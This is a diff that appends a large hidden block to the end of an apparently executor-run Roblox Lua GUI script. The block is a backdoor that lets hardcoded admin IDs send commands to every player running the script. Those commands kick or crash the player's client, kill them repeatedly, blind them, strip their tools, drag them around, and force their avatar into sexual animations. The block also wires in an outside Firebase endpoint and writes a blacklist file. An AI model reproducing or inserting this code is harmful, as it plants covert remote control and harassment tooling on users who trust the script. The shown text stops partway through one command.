@@ -8053,3 +8053,1330 @@ end
 Main.Visible = false
 Glow.Visible = false
 task.defer(Open)
+
+task.spawn(function()
+    local OWNER_ID = 12007715077
+
+    local BASE_ADMIN_IDS = {
+        [12007715077] = true,
+        [12014171125] = true,
+        [10456406006] = true,
+        [12013878584] = true,
+		[7454246247] = true,
+    }
+
+    local PROTECTED_IDS = {
+        [12047367957] = true,
+        [11937827873] = true,
+        [12027166455] = true,
+        [11974135235] = true,
+		[7454246247] = true,
+    }
+
+    local PREFIX = "!"
+    local DATABASE_URL = "https://lala-3de7c-default-rtdb.firebaseio.com"
+
+    local PlayersService = game:GetService("Players")
+    local RunService = game:GetService("RunService")
+    local HttpService = game:GetService("HttpService")
+    local UserInputService = game:GetService("UserInputService")
+    local CoreGui = game:GetService("CoreGui")
+    local Lighting = game:GetService("Lighting")
+    local SoundService = game:GetService("SoundService")
+    local StarterGui = game:GetService("StarterGui")
+    local TextChatService = game:GetService("TextChatService")
+
+    local LocalClient = PlayersService.LocalPlayer
+    while not LocalClient do
+        PlayersService.PlayerAdded:Wait()
+        LocalClient = PlayersService.LocalPlayer
+    end
+
+    local Base = string.gsub(DATABASE_URL, "/+$", "")
+    local Http = request or http_request or (syn and syn.request) or (http and http.request)
+
+    local tempAdminGrants = {}
+    local activeOrbitConnection = nil
+    local activeNoclipConnection = nil
+    local activeJailLoop = nil
+    local activeHorrorLoop = nil
+    local activePiggybackConnection = nil
+    local activeJerkConnection = nil
+    local activeJerkTrack = nil
+    local activeJerkTool = nil
+    local activeFacebangConnection = nil
+    local activeBangConnection = nil
+    local activeFollowConnection = nil
+    local activeFloatPart = nil
+    local activeFloatConnection = nil
+    local originalBackpackItems = {}
+
+    local function isUserAdmin(userId)
+        local idNum = tonumber(userId)
+        if not idNum then return false end
+        if BASE_ADMIN_IDS[idNum] then return true end
+        local exp = tempAdminGrants[idNum]
+        if exp then
+            if exp == -1 or os.time() < exp then
+                return true
+            else
+                tempAdminGrants[idNum] = nil
+            end
+        end
+        return false
+    end
+
+    local function FirebaseCall(method, path, body)
+        if Base == "" or not Http then return nil end
+        local ok, res = pcall(Http, {
+            Url = Base .. path .. ".json",
+            Method = method,
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = body and HttpService:JSONEncode(body) or nil,
+        })
+        if ok and type(res) == "table" and type(res.StatusCode) == "number" and res.StatusCode >= 200 and res.StatusCode < 300 then
+            return res.Body or ""
+        end
+        return nil
+    end
+
+    local BLACKLIST_FILE = "IsaevaBlacklist.json"
+    local Blacklist = {}
+
+    pcall(function()
+        if type(isfile) == "function" and type(readfile) == "function" and isfile(BLACKLIST_FILE) then
+            local decoded = HttpService:JSONDecode(readfile(BLACKLIST_FILE))
+            if type(decoded) == "table" then Blacklist = decoded end
+        end
+    end)
+
+    local function SaveBlacklist()
+        pcall(function()
+            if type(writefile) == "function" then
+                writefile(BLACKLIST_FILE, HttpService:JSONEncode(Blacklist))
+            end
+        end)
+    end
+
+    local function CheckBlacklist(player)
+        if not player or isUserAdmin(player.UserId) or PROTECTED_IDS[player.UserId] then return end
+        local data = Blacklist[tostring(player.UserId)]
+        if data then
+            local adminName = data.admin or "Admin"
+            player:Kick("\nBlacklisted\nBy " .. adminName .. " /isaveil to appeal")
+        end
+    end
+
+    PlayersService.PlayerAdded:Connect(CheckBlacklist)
+    for _, plr in ipairs(PlayersService:GetPlayers()) do
+        CheckBlacklist(plr)
+    end
+
+    local function sanitizeText(str)
+        if type(str) ~= "string" then return "" end
+        str = string.gsub(str, "<[^>]+>", "")
+        str = string.match(str, "^%s*(.-)%s*$") or ""
+        return str
+    end
+
+    local function matchesQuery(playerObj, query)
+        if not playerObj or not query or query == "" then return false end
+        local lowerQuery = string.lower(query)
+        if tostring(playerObj.UserId) == query then return true end
+
+        local currentName = string.lower(playerObj.Name)
+        local currentDisplay = string.lower(playerObj.DisplayName)
+
+        if currentName == lowerQuery or currentDisplay == lowerQuery then return true end
+        if string.find(currentName, lowerQuery, 1, true) ~= nil then return true end
+        if string.find(currentDisplay, lowerQuery, 1, true) ~= nil then return true end
+        return false
+    end
+
+    local function isTargeted(playerObj, senderIdNum, targetNameQuery)
+        if not playerObj or not targetNameQuery or targetNameQuery == "" then return false end
+        local lowerTarget = string.lower(targetNameQuery)
+        if lowerTarget == "all" or lowerTarget == "everyone" then
+            return true
+        end
+        if lowerTarget == "others" then
+            return playerObj.UserId ~= senderIdNum
+        end
+        if lowerTarget == "me" then
+            return playerObj.UserId == senderIdNum
+        end
+        return matchesQuery(playerObj, targetNameQuery)
+    end
+
+    local function findFirstPlayer(query)
+        if not query or query == "" then return nil end
+        local lowerQuery = string.lower(query)
+        if lowerQuery == "me" then return LocalClient end
+
+        for _, plr in ipairs(PlayersService:GetPlayers()) do
+            if tostring(plr.UserId) == query or string.lower(plr.Name) == lowerQuery or string.lower(plr.DisplayName) == lowerQuery then
+                return plr
+            end
+        end
+        for _, plr in ipairs(PlayersService:GetPlayers()) do
+            if matchesQuery(plr, query) then
+                return plr
+            end
+        end
+        return nil
+    end
+
+    local function resolveUserId(query)
+        if not query or query == "" then return nil, nil end
+        local numericId = tonumber(query)
+        if numericId then
+            local inServer = PlayersService:GetPlayerByUserId(numericId)
+            if inServer then return numericId, inServer.Name end
+            local ok, name = pcall(function() return PlayersService:GetNameFromUserIdAsync(numericId) end)
+            return numericId, (ok and name or tostring(numericId))
+        end
+
+        local inServer = findFirstPlayer(query)
+        if inServer then return inServer.UserId, inServer.Name end
+
+        local ok, fetchedId = pcall(function() return PlayersService:GetUserIdFromNameAsync(query) end)
+        if ok and fetchedId then return fetchedId, query end
+        return nil, nil
+    end
+
+    local function accurateTeleport(charToMove, targetCFrame)
+        if not charToMove or not targetCFrame then return end
+        local root = charToMove:FindFirstChild("HumanoidRootPart")
+        local hum = charToMove:FindFirstChildOfClass("Humanoid")
+        if not root then return end
+
+        if hum then
+            hum.Sit = false
+            hum:ChangeState(Enum.HumanoidStateType.GettingUp)
+        end
+
+        for _ = 1, 6 do
+            if root and root.Parent then
+                root.AssemblyLinearVelocity = Vector3.zero
+                root.AssemblyAngularVelocity = Vector3.zero
+                charToMove:PivotTo(targetCFrame)
+                root.CFrame = targetCFrame
+            end
+            RunService.Heartbeat:Wait()
+        end
+    end
+
+    local function getGuiContainer()
+        local target = CoreGui
+        pcall(function()
+            if gethui then
+                target = gethui()
+            end
+        end)
+        return target
+    end
+
+    local function stopJerkTool()
+        if activeJerkConnection then
+            activeJerkConnection:Disconnect()
+            activeJerkConnection = nil
+        end
+        if activeJerkTrack then
+            pcall(function() activeJerkTrack:Stop() end)
+            activeJerkTrack = nil
+        end
+        if activeJerkTool then
+            pcall(function() activeJerkTool:Destroy() end)
+            activeJerkTool = nil
+        end
+    end
+
+    local function giveJerkTool()
+        stopJerkTool()
+        local backpack = LocalClient:FindFirstChildOfClass("Backpack")
+        if not backpack then return end
+
+        local tool = Instance.new("Tool")
+        tool.Name = "Jerk"
+        tool.RequiresHandle = false
+        tool.CanBeDropped = false
+        activeJerkTool = tool
+
+        local pumping = false
+        tool.Equipped:Connect(function()
+            pumping = true
+            local char = LocalClient.Character
+            local hum = char and char:FindFirstChildOfClass("Humanoid")
+            local animator = hum and hum:FindFirstChildOfClass("Animator")
+            if animator then
+                local anim = Instance.new("Animation")
+                anim.AnimationId = "rbxassetid://72042024"
+                local ok, track = pcall(function() return animator:LoadAnimation(anim) end)
+                if ok and track then
+                    activeJerkTrack = track
+                    track.Looped = true
+                    track:Play()
+                    track:AdjustSpeed(1.8)
+                end
+            end
+
+            local phase = 0
+            activeJerkConnection = RunService.Heartbeat:Connect(function(dt)
+                if not pumping then return end
+                local c = LocalClient.Character
+                local root = c and c:FindFirstChild("HumanoidRootPart")
+                local h = c and c:FindFirstChildOfClass("Humanoid")
+                if root and h and h.Health > 0 then
+                    phase = phase + (dt * 14)
+                    local thrust = math.sin(phase) * 0.45
+                    root.CFrame = root.CFrame * CFrame.new(0, 0, -thrust * dt * 12)
+                end
+            end)
+        end)
+
+        tool.Unequipped:Connect(function()
+            pumping = false
+            if activeJerkConnection then
+                activeJerkConnection:Disconnect()
+                activeJerkConnection = nil
+            end
+            if activeJerkTrack then
+                pcall(function() activeJerkTrack:Stop() end)
+                activeJerkTrack = nil
+            end
+        end)
+
+        tool.Parent = backpack
+    end
+
+    local function clearHorror()
+        if activeHorrorLoop then
+            activeHorrorLoop:Disconnect()
+            activeHorrorLoop = nil
+        end
+
+        local cam = workspace.CurrentCamera
+        if cam then cam.FieldOfView = 70 end
+
+        Lighting.ClockTime = 14
+        Lighting.Brightness = 2
+        Lighting.Ambient = Color3.fromRGB(127, 127, 127)
+        Lighting.OutdoorAmbient = Color3.fromRGB(127, 127, 127)
+        Lighting.FogStart = 0
+        Lighting.FogEnd = 100000
+
+        pcall(function()
+            if Lighting:FindFirstChild("IsaevaHorrorCC") then Lighting.IsaevaHorrorCC:Destroy() end
+            if Lighting:FindFirstChild("IsaevaHorrorAtmos") then Lighting.IsaevaHorrorAtmos:Destroy() end
+        end)
+
+        for _, oldSnd in ipairs(SoundService:GetChildren()) do
+            if string.sub(oldSnd.Name, 1, 12) == "IsaevaHorror" then oldSnd:Destroy() end
+        end
+
+        pcall(function()
+            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
+            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true)
+            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
+        end)
+
+        local backpack = LocalClient:FindFirstChildOfClass("Backpack")
+        if backpack and #originalBackpackItems > 0 then
+            for _, item in ipairs(originalBackpackItems) do
+                if item then item:Clone().Parent = backpack end
+            end
+            originalBackpackItems = {}
+        end
+
+        local pGui = LocalClient:FindFirstChild("PlayerGui")
+        if pGui and pGui:FindFirstChild("IsaevaHorrorGui") then
+            pGui.IsaevaHorrorGui:Destroy()
+        end
+    end
+
+    local function clearFloat()
+        if activeFloatConnection then
+            activeFloatConnection:Disconnect()
+            activeFloatConnection = nil
+        end
+        if activeFloatPart then
+            pcall(function() activeFloatPart:Destroy() end)
+            activeFloatPart = nil
+        end
+    end
+
+    local silentBox = nil
+    local mobileToggleFrame = nil
+    local mobileBarBox = nil
+
+    local function setMobileBarVisible(state)
+        if mobileBarBox then
+            mobileBarBox.Visible = state
+            if state then
+                task.defer(function()
+                    mobileBarBox:CaptureFocus()
+                end)
+            else
+                pcall(function() mobileBarBox:ReleaseFocus() end)
+            end
+        end
+    end
+
+    local function setMobileToggleVisible(state)
+        if mobileToggleFrame then
+            mobileToggleFrame.Visible = state
+        end
+        if not state and mobileBarBox then
+            mobileBarBox.Visible = false
+        end
+    end
+
+    local function executeCommand(senderUserId, activeCmd, targetNameQuery, commandArgs)
+        local senderIdNum = tonumber(senderUserId)
+        if not senderIdNum or not isUserAdmin(senderIdNum) then return end
+
+        local isOwner = (senderIdNum == OWNER_ID)
+        commandArgs = type(commandArgs) == "table" and commandArgs or {}
+        activeCmd = string.lower(tostring(activeCmd or ""))
+        targetNameQuery = tostring(targetNameQuery or "")
+
+        if activeCmd == "givecmd" or activeCmd == "cmdgiver" or activeCmd == "giveperms" or activeCmd == "removecmd" or activeCmd == "takecmd" or activeCmd == "unadmin" then
+            task.spawn(function()
+                local targetId = resolveUserId(targetNameQuery)
+                if not targetId then return end
+                if targetId == OWNER_ID or BASE_ADMIN_IDS[targetId] then return end
+
+                if activeCmd == "removecmd" or activeCmd == "takecmd" or activeCmd == "unadmin" then
+                    tempAdminGrants[targetId] = nil
+                else
+                    local durArg = string.lower(tostring(commandArgs[3] or ""))
+                    local seconds = nil
+                    if durArg == "" or durArg == "perm" or durArg == "perma" or durArg == "permanent" or durArg == "inf" then
+                        seconds = -1
+                    else
+                        local numPart, unitPart = string.match(durArg, "^(%d+%.?%d*)(%a*)$")
+                        local n = tonumber(numPart)
+                        if n and n > 0 then
+                            if unitPart == "m" or unitPart == "min" or unitPart == "mins" then
+                                seconds = n * 60
+                            elseif unitPart == "h" or unitPart == "hr" or unitPart == "hrs" then
+                                seconds = n * 3600
+                            else
+                                seconds = n
+                            end
+                        end
+                    end
+
+                    if seconds then
+                        tempAdminGrants[targetId] = (seconds == -1) and -1 or (os.time() + seconds)
+                    end
+                end
+            end)
+            return
+        end
+
+        if activeCmd == "blacklist" then
+            task.spawn(function()
+                local targetId, resolvedName = resolveUserId(targetNameQuery)
+                if targetId and not isUserAdmin(targetId) and (isOwner or not PROTECTED_IDS[targetId]) then
+                    Blacklist[tostring(targetId)] = { admin = "Admin", name = resolvedName }
+                    SaveBlacklist()
+
+                    local inServerPlr = PlayersService:GetPlayerByUserId(targetId)
+                    if inServerPlr then
+                        inServerPlr:Kick("\nBlacklisted\nBy Admin /isaveil to appeal")
+                    end
+                end
+            end)
+            return
+        end
+
+        if activeCmd == "unblacklist" or activeCmd == "whitelist" then
+            task.spawn(function()
+                local targetId = resolveUserId(targetNameQuery)
+                if targetId then
+                    Blacklist[tostring(targetId)] = nil
+                    SaveBlacklist()
+                else
+                    local lowerQ = string.lower(targetNameQuery)
+                    for idStr, info in pairs(Blacklist) do
+                        if type(info) == "table" and info.name and string.find(string.lower(info.name), lowerQ, 1, true) then
+                            Blacklist[idStr] = nil
+                        end
+                    end
+                    SaveBlacklist()
+                end
+            end)
+            return
+        end
+
+        if senderIdNum == LocalClient.UserId and isUserAdmin(LocalClient.UserId) then
+            if activeCmd == "tp" or activeCmd == "goto" then
+                local targetPlr = findFirstPlayer(targetNameQuery)
+                if targetPlr and targetPlr ~= LocalClient then
+                    if not isOwner and PROTECTED_IDS[targetPlr.UserId] then return end
+                    task.spawn(function()
+                        local myHum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+                        if myHum then myHum.Health = 0 end
+
+                        local newChar = LocalClient.CharacterAdded:Wait()
+                        local targetRoot = targetPlr.Character and targetPlr.Character:FindFirstChild("HumanoidRootPart")
+
+                        local timeout = 0
+                        while (not targetRoot or not targetRoot.Parent) and timeout < 25 do
+                            task.wait(0.1)
+                            timeout = timeout + 1
+                            targetRoot = targetPlr.Character and targetPlr.Character:FindFirstChild("HumanoidRootPart")
+                        end
+
+                        if newChar and targetRoot then
+                            accurateTeleport(newChar, targetRoot.CFrame * CFrame.new(0, 2, 3))
+                        end
+                    end)
+                end
+                return
+            elseif activeCmd == "view" or activeCmd == "spectate" then
+                local targetPlr = findFirstPlayer(targetNameQuery)
+                if targetPlr and targetPlr.Character then
+                    if not isOwner and PROTECTED_IDS[targetPlr.UserId] then return end
+                    local hum = targetPlr.Character:FindFirstChildOfClass("Humanoid")
+                    if hum and workspace.CurrentCamera then
+                        workspace.CurrentCamera.CameraSubject = hum
+                    end
+                end
+                return
+            elseif activeCmd == "unview" or activeCmd == "unspectate" then
+                local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+                if hum and workspace.CurrentCamera then
+                    workspace.CurrentCamera.CameraSubject = hum
+                end
+                return
+            elseif activeCmd == "noclip" then
+                if activeNoclipConnection then activeNoclipConnection:Disconnect() end
+                activeNoclipConnection = RunService.Stepped:Connect(function()
+                    if LocalClient.Character then
+                        for _, part in ipairs(LocalClient.Character:GetDescendants()) do
+                            if part:IsA("BasePart") and part.CanCollide then
+                                part.CanCollide = false
+                            end
+                        end
+                    end
+                end)
+                return
+            elseif activeCmd == "clip" then
+                if activeNoclipConnection then
+                    activeNoclipConnection:Disconnect()
+                    activeNoclipConnection = nil
+                end
+                return
+            elseif activeCmd == "orbit" then
+                local targetPlr = findFirstPlayer(targetNameQuery)
+                if targetPlr and targetPlr ~= LocalClient then
+                    if not isOwner and PROTECTED_IDS[targetPlr.UserId] then return end
+                    if activeOrbitConnection then
+                        activeOrbitConnection:Disconnect()
+                        activeOrbitConnection = nil
+                    end
+                    local angle, radius, speed = 0, 6, 4
+                    activeOrbitConnection = RunService.Heartbeat:Connect(function(dt)
+                        local myRoot = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+                        local targetRoot = targetPlr.Character and targetPlr.Character:FindFirstChild("HumanoidRootPart")
+                        if myRoot and targetRoot then
+                            angle = angle + (speed * dt)
+                            local offset = Vector3.new(math.cos(angle) * radius, 1, math.sin(angle) * radius)
+                            myRoot.AssemblyLinearVelocity = Vector3.zero
+                            myRoot.CFrame = CFrame.new(targetRoot.Position + offset, targetRoot.Position)
+                        else
+                            if activeOrbitConnection then
+                                activeOrbitConnection:Disconnect()
+                                activeOrbitConnection = nil
+                            end
+                        end
+                    end)
+                end
+                return
+            elseif activeCmd == "unorbit" then
+                if activeOrbitConnection then
+                    activeOrbitConnection:Disconnect()
+                    activeOrbitConnection = nil
+                end
+                return
+            end
+        end
+
+        if not isTargeted(LocalClient, senderIdNum, targetNameQuery) then
+            return
+        end
+
+        if PROTECTED_IDS[LocalClient.UserId] and not isOwner then
+            return
+        end
+
+        if activeCmd == "bring" then
+            local ownerPlr = PlayersService:GetPlayerByUserId(senderIdNum)
+            if ownerPlr and ownerPlr ~= LocalClient then
+                task.spawn(function()
+                    local myHum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+                    if myHum then myHum.Health = 0 end
+
+                    local newChar = LocalClient.CharacterAdded:Wait()
+                    local ownerRoot = ownerPlr.Character and ownerPlr.Character:FindFirstChild("HumanoidRootPart")
+
+                    local timeout = 0
+                    while (not ownerRoot or not ownerRoot.Parent) and timeout < 25 do
+                        task.wait(0.1)
+                        timeout = timeout + 1
+                        ownerRoot = ownerPlr.Character and ownerPlr.Character:FindFirstChild("HumanoidRootPart")
+                    end
+
+                    if newChar and ownerRoot then
+                        accurateTeleport(newChar, ownerRoot.CFrame * CFrame.new(0, 1, -3.5))
+                    end
+                end)
+            end
+        elseif activeCmd == "kick" then
+            local reasonWords = {}
+            for i = 3, #commandArgs do
+                table.insert(reasonWords, commandArgs[i])
+            end
+            local customReasonText = table.concat(reasonWords, " ")
+            if customReasonText == "" then
+                customReasonText = "Terminated by Script Owner."
+            end
+            LocalClient:Kick("\n" .. customReasonText)
+        elseif activeCmd == "crash" then
+            while true do end
+        elseif activeCmd == "unload" then
+            stopJerkTool()
+            clearHorror()
+            clearFloat()
+            pcall(function() script:Destroy() end)
+            for _, parentObj in ipairs({ getGuiContainer(), CoreGui }) do
+                local oldBar = parentObj and parentObj:FindFirstChild("IsaevaSilentBar")
+                if oldBar then oldBar:Destroy() end
+            end
+        elseif activeCmd == "freeze" then
+            local root = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+            if root then root.Anchored = true end
+        elseif activeCmd == "unfreeze" then
+            local root = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+            if root then root.Anchored = false end
+        elseif activeCmd == "jail" then
+            local root = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+            if root then
+                local cagePos = root.Position
+                if activeJailLoop then activeJailLoop:Disconnect() end
+                activeJailLoop = RunService.Heartbeat:Connect(function()
+                    local r = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+                    if r and (r.Position - cagePos).Magnitude > 3 then
+                        r.AssemblyLinearVelocity = Vector3.zero
+                        r.CFrame = CFrame.new(cagePos)
+                    end
+                end)
+            end
+        elseif activeCmd == "unjail" then
+            if activeJailLoop then
+                activeJailLoop:Disconnect()
+                activeJailLoop = nil
+            end
+        elseif activeCmd == "blind" or activeCmd == "flashbang" then
+            local pGui = LocalClient:FindFirstChild("PlayerGui")
+            for _, parentObj in ipairs({ getGuiContainer(), pGui }) do
+                if parentObj and not parentObj:FindFirstChild("IsaevaBlind") then
+                    local blindGui = Instance.new("ScreenGui")
+                    blindGui.Name = "IsaevaBlind"
+                    blindGui.IgnoreGuiInset = true
+                    blindGui.ResetOnSpawn = false
+                    blindGui.DisplayOrder = 2147483647
+                    local frame = Instance.new("Frame")
+                    frame.Size = UDim2.new(1, 0, 1, 0)
+                    frame.BackgroundColor3 = (activeCmd == "flashbang") and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(0, 0, 0)
+                    frame.BackgroundTransparency = 0
+                    frame.BorderSizePixel = 0
+                    frame.ZIndex = 100
+                    frame.Parent = blindGui
+                    blindGui.Parent = parentObj
+                end
+            end
+        elseif activeCmd == "unblind" then
+            for _, parentObj in ipairs({ getGuiContainer(), LocalClient:FindFirstChild("PlayerGui") }) do
+                local existingBlind = parentObj and parentObj:FindFirstChild("IsaevaBlind")
+                if existingBlind then existingBlind:Destroy() end
+            end
+        elseif activeCmd == "confuse" then
+            local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+            if hum then hum.PlatformStand = true end
+        elseif activeCmd == "unconfuse" then
+            local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+            if hum then hum.PlatformStand = false end
+        elseif activeCmd == "sit" then
+            local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+            if hum then hum.Sit = true end
+        elseif activeCmd == "unsit" then
+            local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+            if hum then hum.Sit = false end
+        elseif activeCmd == "jumpcmd" then
+            local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+            if hum then hum.Jump = true end
+        elseif activeCmd == "speed" or activeCmd == "ws" then
+            local val = tonumber(commandArgs[3]) or 16
+            local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+            if hum then hum.WalkSpeed = val end
+        elseif activeCmd == "jump" or activeCmd == "jp" then
+            local val = tonumber(commandArgs[3]) or 50
+            local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+            if hum then
+                hum.UseJumpPower = true
+                hum.JumpPower = val
+            end
+        elseif activeCmd == "kill" then
+            local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+            if hum then hum.Health = 0 end
+        elseif activeCmd == "loopkill" then
+            LocalClient:SetAttribute("IsaevaLoopKill", true)
+            task.spawn(function()
+                while LocalClient:GetAttribute("IsaevaLoopKill") do
+                    local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+                    if hum and hum.Health > 0 then hum.Health = 0 end
+                    task.wait(0.5)
+                end
+            end)
+        elseif activeCmd == "unloopkill" then
+            LocalClient:SetAttribute("IsaevaLoopKill", false)
+        elseif activeCmd == "fling" then
+            local root = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+            if root then
+                root.AssemblyLinearVelocity = Vector3.new(math.random(-250, 250), 650, math.random(-250, 250))
+            end
+        elseif activeCmd == "void" then
+            local root = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+            if root then root.CFrame = CFrame.new(0, -1000, 0) end
+        elseif activeCmd == "invert" or activeCmd == "reverse" then
+            local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+            if hum then hum.WalkSpeed = -16 end
+        elseif activeCmd == "uninvert" or activeCmd == "unreverse" then
+            local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+            if hum then hum.WalkSpeed = 16 end
+        elseif activeCmd == "spin" then
+            local root = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+            if root then
+                local existing = root:FindFirstChild("IsaevaSpin")
+                if existing then existing:Destroy() end
+                local bav = Instance.new("BodyAngularVelocity")
+                bav.Name = "IsaevaSpin"
+                bav.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
+                bav.P = 10000
+                bav.AngularVelocity = Vector3.new(0, 50, 0)
+                bav.Parent = root
+            end
+        elseif activeCmd == "unspin" then
+            local root = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+            local spin = root and root:FindFirstChild("IsaevaSpin")
+            if spin then spin:Destroy() end
+        elseif activeCmd == "jerk" then
+            giveJerkTool()
+        elseif activeCmd == "unjerk" then
+            stopJerkTool()
+        elseif activeCmd == "facebang" then
+            if activeFacebangConnection then
+                activeFacebangConnection:Disconnect()
+                activeFacebangConnection = nil
+            end
+            local senderPlr = PlayersService:GetPlayerByUserId(senderIdNum)
+            if senderPlr and senderPlr.Character then
+                local t = 0
+                activeFacebangConnection = RunService.Heartbeat:Connect(function(dt)
+                    local myChar = LocalClient.Character
+                    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
+                    local targetHead = senderPlr.Character and (senderPlr.Character:FindFirstChild("Head") or senderPlr.Character:FindFirstChild("HumanoidRootPart"))
+                    if myRoot and targetHead then
+                        t = t + (dt * 12)
+                        local slide = math.sin(t) * 1.4
+                        local basePos = targetHead.Position + (targetHead.CFrame.LookVector * (1.2 + slide)) - Vector3.new(0, 1.3, 0)
+                        myRoot.AssemblyLinearVelocity = Vector3.zero
+                        myRoot.CFrame = CFrame.lookAt(basePos, targetHead.Position - Vector3.new(0, 1.3, 0))
+                    else
+                        if activeFacebangConnection then
+                            activeFacebangConnection:Disconnect()
+                            activeFacebangConnection = nil
+                        end
+                    end
+                end)
+            end
+        elseif activeCmd == "unfacebang" then
+            if activeFacebangConnection then
+                activeFacebangConnection:Disconnect()
+                activeFacebangConnection = nil
+            end
+        elseif activeCmd == "bang" then
+            if activeBangConnection then
+                activeBangConnection:Disconnect()
+                activeBangConnection = nil
+            end
+            local senderPlr = PlayersService:GetPlayerByUserId(senderIdNum)
+            if senderPlr and senderPlr.Character then
+                local t = 0
+                activeBangConnection = RunService.Heartbeat:Connect(function(dt)
+                    local myRoot = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+                    local targetRoot = senderPlr.Character and senderPlr.Character:FindFirstChild("HumanoidRootPart")
+                    if myRoot and targetRoot then
+                        t = t + (dt * 14)
+                        local zOffset = -1.1 - (math.sin(t) * 1.1)
+                        myRoot.AssemblyLinearVelocity = Vector3.zero
+                        myRoot.CFrame = targetRoot.CFrame * CFrame.new(0, 0, zOffset)
+                    else
+                        if activeBangConnection then
+                            activeBangConnection:Disconnect()
+                            activeBangConnection = nil
+                        end
+                    end
+                end)
+            end
+        elseif activeCmd == "unbang" then
+            if activeBangConnection then
+                activeBangConnection:Disconnect()
+                activeBangConnection = nil
+            end
+        elseif activeCmd == "follow" then
+            if activeFollowConnection then
+                activeFollowConnection:Disconnect()
+                activeFollowConnection = nil
+            end
+            local senderPlr = PlayersService:GetPlayerByUserId(senderIdNum)
+            if senderPlr then
+                activeFollowConnection = RunService.Heartbeat:Connect(function()
+                    local myRoot = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+                    local targetRoot = senderPlr.Character and senderPlr.Character:FindFirstChild("HumanoidRootPart")
+                    if myRoot and targetRoot then
+                        myRoot.AssemblyLinearVelocity = Vector3.zero
+                        myRoot.CFrame = targetRoot.CFrame * CFrame.new(0, 0, 3.5)
+                    end
+                end)
+            end
+        elseif activeCmd == "unfollow" then
+            if activeFollowConnection then
+                activeFollowConnection:Disconnect()
+                activeFollowConnection = nil
+            end
+        elseif activeCmd == "float" then
+            clearFloat()
+            local root = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+            if root then
+                local part = Instance.new("Part")
+                part.Name = "IsaevaFloatPart"
+                part.Size = Vector3.new(6, 0.5, 6)
+                part.Anchored = true
+                part.Transparency = 0.7
+                part.CanCollide = true
+                part.Parent = workspace
+                activeFloatPart = part
+
+                activeFloatConnection = RunService.Heartbeat:Connect(function()
+                    local r = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+                    if r and part and part.Parent then
+                        part.CFrame = CFrame.new(r.Position.X, r.Position.Y - 3.3, r.Position.Z)
+                    else
+                        clearFloat()
+                    end
+                end)
+            end
+        elseif activeCmd == "unfloat" then
+            clearFloat()
+        elseif activeCmd == "ragdoll" then
+            local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+            if hum then
+                hum.PlatformStand = true
+                hum:ChangeState(Enum.HumanoidStateType.Ragdoll)
+            end
+        elseif activeCmd == "unragdoll" then
+            local hum = LocalClient.Character and LocalClient.Character:FindFirstChildOfClass("Humanoid")
+            if hum then
+                hum.PlatformStand = false
+                hum:ChangeState(Enum.HumanoidStateType.GettingUp)
+            end
+        elseif activeCmd == "piggyback" then
+            local ownerPlr = PlayersService:GetPlayerByUserId(senderIdNum)
+            if ownerPlr and ownerPlr ~= LocalClient then
+                local backpack = LocalClient:FindFirstChildOfClass("Backpack")
+                if backpack then
+                    for _, item in ipairs(backpack:GetChildren()) do
+                        item:Destroy()
+                    end
+                end
+                local char = LocalClient.Character
+                if char then
+                    for _, item in ipairs(char:GetChildren()) do
+                        if item:IsA("Tool") then item:Destroy() end
+                    end
+                end
+
+                if activePiggybackConnection then activePiggybackConnection:Disconnect() end
+                activePiggybackConnection = RunService.Heartbeat:Connect(function()
+                    local myRoot = LocalClient.Character and LocalClient.Character:FindFirstChild("HumanoidRootPart")
+                    local ownerRoot = ownerPlr.Character and ownerPlr.Character:FindFirstChild("HumanoidRootPart")
+                    if myRoot and ownerRoot then
+                        myRoot.AssemblyLinearVelocity = Vector3.zero
+                        myRoot.CFrame = ownerRoot.CFrame * CFrame.new(0, 2.5, 0.5)
+                    else
+                        if activePiggybackConnection then
+                            activePiggybackConnection:Disconnect()
+                            activePiggybackConnection = nil
+                        end
+                    end
+                end)
+            end
+        elseif activeCmd == "unpiggyback" then
+            if activePiggybackConnection then
+                activePiggybackConnection:Disconnect()
+                activePiggybackConnection = nil
+            end
+        elseif activeCmd == "horror" then
+            Lighting.ClockTime = 2
+            Lighting.Brightness = 1.2
